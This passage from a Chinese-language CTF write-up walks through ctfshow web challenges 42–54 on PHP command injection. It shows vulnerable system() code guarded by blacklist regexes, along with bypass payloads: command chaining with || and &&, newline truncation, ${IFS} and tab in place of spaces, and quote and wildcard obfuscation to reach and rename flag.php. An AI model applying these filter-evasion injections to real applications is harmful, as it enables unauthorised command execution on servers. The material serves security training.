class="hljs-number">2</span>）使用逻辑或 ||  ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>ls|| 对于两个或，前面为真，只执行前面的，后面命令不会执行；而对于一个或， 无论第一个命令执行为真还是假，都是直接执行第二个命令。<br>（<span class="hljs-number">3</span>）使用 &amp;&amp; 或者 &amp;  <br>对于两个与，当第一个命令执行失败（为假），那么第二个命令也不会被执行；对于一个与，前面的语句为假则直接执行后面的，前面可真可假，后面命令都会执行； 需要改成url编码 ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><br><span class="hljs-number">4</span>、<span class="hljs-variable">%0</span>a 换行符截断 ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>ls<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure><h4 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  preg_match 过滤了cat指令和;，cat指令可以用nl tac等等代替<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">https://6b67134c-<span class="hljs-number">1e91</span>-<span class="hljs-number">4b30</span>-8fc9-8fbd3c7680ed.challenge.ctf.<span class="hljs-built_in">show</span>/?c=more flag.php||<br></code></pre></td></tr></table></figure><h4 id="web-44-45-46-47-48-49"><a href="#web-44-45-46-47-48-49" class="headerlink" title="web 44 45 46 47 48 49"></a>web 44 45 46 47 48 49</h4><p>都千篇一律了 就是多了个正则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.绕过<span class="hljs-built_in">cat</span>使用：<br><br><span class="hljs-built_in">tac</span> more less <span class="hljs-built_in">head</span> <span class="hljs-built_in">tac</span> <span class="hljs-built_in">tail</span> <span class="hljs-built_in">nl</span> <span class="hljs-built_in">od</span>(二进制查看) vi vim <span class="hljs-built_in">sort</span> <span class="hljs-built_in">uniq</span> rev<br><br>2.绕过空格用：<br><br>%09 &lt;&gt;  &lt; <span class="hljs-variable">$&#123;IFS&#125;</span> $IFS$ &#123;<span class="hljs-built_in">cat</span>,fl*&#125; %20<br><br>注：<br><br>%09  <span class="hljs-comment">##（Tab） %20 ##（space）</span><br><br>3.对flag的过滤（这里也就几个，索性就全丢出来了）<br><br>1.‘’    （例如fl‘’ag）<br><br>2.“”     （例如fl<span class="hljs-string">&quot;&quot;</span>ag)<br><br>3.?       (例如fl??)<br><br>4.*          (例如fl*）<br></code></pre></td></tr></table></figure><h4 id="web-50-51-52-53"><a href="#web-50-51-52-53" class="headerlink" title="web 50 51 52 53"></a>web 50 51 52 53</h4><p>\x09与\x26的含义其实就是%09（tab键）和%26（&amp;）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>依旧用前边的?c&#x3D;nl&lt;&gt;f’’lag.php||</p><h4 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>基本上都被过滤</p><p>像这种可以选择使用之前讲过的一种用?通配符来构造的方式，如：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">对flag.php的构造可以这样：fl?<span class="hljs-string">?.</span><span class="hljs-string">??</span>?<br>甚至可以简化为：<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br><br>同样，命令也可以进行构造<br>cat可以构造为<span class="hljs-string">?a</span>t、c??<br><br><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/c</span>?<span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">IFS</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>可以理解为当前目录运行cat命令实际上运行的也是bin/cat，而通配符不会帮你去找到bin下面的cat<br>只会在当前目录寻找能通配的文件,所以用通配符运行时必须给出路径<br>另外grep命令可以才文件中查找含有的字符串<br>形式：grep [字符串] [filename]<br><span class="hljs-string">?c</span>=grep<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;ctfshow<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure><p>题重命名文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=mv<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl?<span class="hljs-string">?.</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">IFS</span>&#125;a.txt<br>把flag.php重命名为了a.txt<br>然后直接访问a.txt就行<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
